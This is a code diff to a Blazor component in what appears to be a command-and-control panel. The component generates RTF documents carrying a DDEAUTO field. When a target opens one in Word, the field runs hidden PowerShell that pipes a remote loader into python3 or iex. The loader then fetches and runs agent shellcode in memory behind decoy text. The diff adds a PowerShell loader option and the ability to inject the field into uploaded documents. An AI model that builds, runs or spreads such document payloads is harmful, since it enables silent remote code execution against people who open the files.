@@ -3,26 +3,43 @@
 <div class="tool-panel">
     <div class="tool-header">
         <h3 class="tool-title">RTF Generator</h3>
-        <p class="tool-subtitle">Generate RTF documents that execute the Python loader via DDE — no macros or templates needed.</p>
+        <p class="tool-subtitle">Generate RTF documents that execute a loader via DDE — no macros or templates needed.</p>
     </div>
 
     <div class="loader-content">
         <div class="loader-section">
             <h4 class="loader-section-title">Overview</h4>
             <p class="loader-text">
-                Generates an RTF document with a DDE (Dynamic Data Exchange) field that runs the Python loader
+                Generates an RTF document with a DDE (Dynamic Data Exchange) field that runs a loader
                 one-liner when the document is opened in Microsoft Word. No VBA macros, no remote templates
                 — the RTF itself triggers the command. The user sees a single "Update links?" prompt.
             </p>
         </div>
 
         <div class="loader-section">
-            <h4 class="loader-section-title">1 — Python Loader URL</h4>
+            <h4 class="loader-section-title">1 — Loader</h4>
+            <div class="loader-tabs">
+                <button class="loader-tab @(_loaderType == LoaderType.Python ? "loader-tab--active" : "")"
+                        @onclick="() => SetLoaderType(LoaderType.Python)">
+                    <C2Icon Name="code" Size="Size.Xs" /> Python
+                </button>
+                <button class="loader-tab @(_loaderType == LoaderType.PowerShell ? "loader-tab--active" : "")"
+                        @onclick="() => SetLoaderType(LoaderType.PowerShell)">
+                    <C2Icon Name="terminal" Size="Size.Xs" /> PowerShell
+                </button>
+            </div>
             <p class="loader-text loader-hint">
-                URL of the Python loader script. The DDE field will run <code>powershell -enc &lt;base64&gt;</code> when the document is opened.
+                @if (_loaderType == LoaderType.Python)
+                {
+                    <span>URL of the Python loader script. DDE runs <code>irm URL | python3</code>.</span>
+                }
+                else
+                {
+                    <span>URL of the PowerShell loader script. DDE runs <code>irm URL | powershell -Command -</code>.</span>
+                }
             </p>
             <C2InputActions Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Monospace BindOnInput
-                            Placeholder="https://raw.githubusercontent.com/.../loader.py" />
+                            Placeholder="@(_loaderType == LoaderType.Python ? "https://raw.githubusercontent.com/.../loader.py" : "https://raw.githubusercontent.com/.../loader.ps1")" />
             <label class="loader-toggle">
                 <input type="checkbox" checked="@_hidden" @onchange="OnHiddenChanged" />
                 <span class="loader-toggle-label">Hidden window</span>
@@ -106,8 +123,8 @@
             <p class="loader-text">
                 1. Target opens the RTF in Microsoft Word<br/>
                 2. Word prompts "This document contains links … Do you want to update?"<br/>
-                3. On accept, the DDE field executes: <code>powershell -NoP -enc [base64 of "curl URL | python3"]</code><br/>
-                4. The Python loader downloads the agent shellcode and runs it in memory<br/>
+                3. On accept, the DDE field executes the loader one-liner via PowerShell<br/>
+                4. The loader downloads the agent shellcode and runs it in memory<br/>
                 5. The document displays the decoy content
             </p>
         </div>
@@ -115,13 +132,16 @@
 </div>
 
 @code {
-    private const string DefaultLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/python/loader.py";
+    private const string DefaultPythonLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/python/loader.py";
+    private const string DefaultPowerShellLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/windows/powershell/loader.ps1";
 
     private enum Mode { Generate, Upload }
+    private enum LoaderType { Python, PowerShell }
 
     private Mode _mode = Mode.Generate;
+    private LoaderType _loaderType = LoaderType.Python;
     private bool _hidden = true;
-    private string _loaderUrl = DefaultLoaderUrl;
+    private string _loaderUrl = DefaultPythonLoaderUrl;
     private string _docTitle = "";
     private string _docBody = "";
     private string _rtfContent = "";
@@ -135,12 +155,21 @@
         _mode = mode;
     }
 
+    private void SetLoaderType(LoaderType type)
+    {
+        _loaderType = type;
+        _loaderUrl = type == LoaderType.Python ? DefaultPythonLoaderUrl : DefaultPowerShellLoaderUrl;
+        Rebuild();
+        if (!string.IsNullOrEmpty(_customRtfOriginal))
+            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
+    }
+
     private void OnLoaderUrlChanged(string v)
     {
         _loaderUrl = v;
         Rebuild();
         if (!string.IsNullOrEmpty(_customRtfOriginal))
-            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden);
+            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
     }
 
     private void OnHiddenChanged(ChangeEventArgs e)
@@ -148,24 +177,27 @@
         _hidden = e.Value is true;
         Rebuild();
         if (!string.IsNullOrEmpty(_customRtfOriginal))
-            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden);
+            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
     }
 
     private void Rebuild()
     {
-        _rtfContent = GenerateRtf(_loaderUrl, _docTitle, _docBody, _hidden);
+        _rtfContent = GenerateRtf(_loaderUrl, _docTitle, _docBody, _hidden, _loaderType);
     }
 
-    private static string BuildDdeField(string loaderUrl, bool hidden)
+    private static string BuildDdeField(string loaderUrl, bool hidden, LoaderType loaderType)
     {
         var windowStyle = hidden ? "-W Hidden " : "";
-        var psArgs = $"{windowStyle}-NoP -C irm {loaderUrl} | python3";
+        var pipe = loaderType == LoaderType.Python
+            ? "python3"
+            : "iex";
+        var psArgs = $"{windowStyle}-NoP -C irm {loaderUrl} | {pipe}";
         return @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe """ + RtfEscape(psArgs) + @"""}}{" + @"\fldrslt }}";
     }
 
-    private static string GenerateRtf(string loaderUrl, string title, string body, bool hidden)
+    private static string GenerateRtf(string loaderUrl, string title, string body, bool hidden, LoaderType loaderType)
     {
-        var ddeField = BuildDdeField(loaderUrl, hidden);
+        var ddeField = BuildDdeField(loaderUrl, hidden, loaderType);
 
         var titleRtf = string.IsNullOrWhiteSpace(title)
             ? ""
@@ -228,13 +260,13 @@
         using var reader = new System.IO.StreamReader(stream);
         _customRtfOriginal = await reader.ReadToEndAsync();
 
-        _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden);
+        _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
         StateHasChanged();
     }
 
-    private static string InjectDde(string rtfContent, string loaderUrl, bool visible)
+    private static string InjectDde(string rtfContent, string loaderUrl, bool visible, LoaderType loaderType)
     {
-        var ddeField = BuildDdeField(loaderUrl, visible) + "\n";
+        var ddeField = BuildDdeField(loaderUrl, visible, loaderType) + "\n";
 
         var pardIdx = rtfContent.IndexOf("\\pard");
         if (pardIdx >= 0)
